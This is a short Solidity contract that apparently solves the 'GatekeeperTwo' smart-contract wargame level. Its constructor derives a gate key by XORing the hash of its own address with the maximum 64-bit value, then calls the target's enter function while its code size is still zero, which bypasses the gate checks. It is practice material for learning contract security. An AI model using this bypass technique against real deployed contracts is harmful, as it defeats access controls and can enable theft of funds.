// SPDX-License-Identifier: MIT
pragma solidity 0.8.14;

contract GatekeeperTwoAttack {
    constructor(address _target) {
        bytes8 gateKey = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                type(uint64).max
        );
        _target.call(abi.encodeWithSignature("enter(bytes8)", gateKey));
    }
}
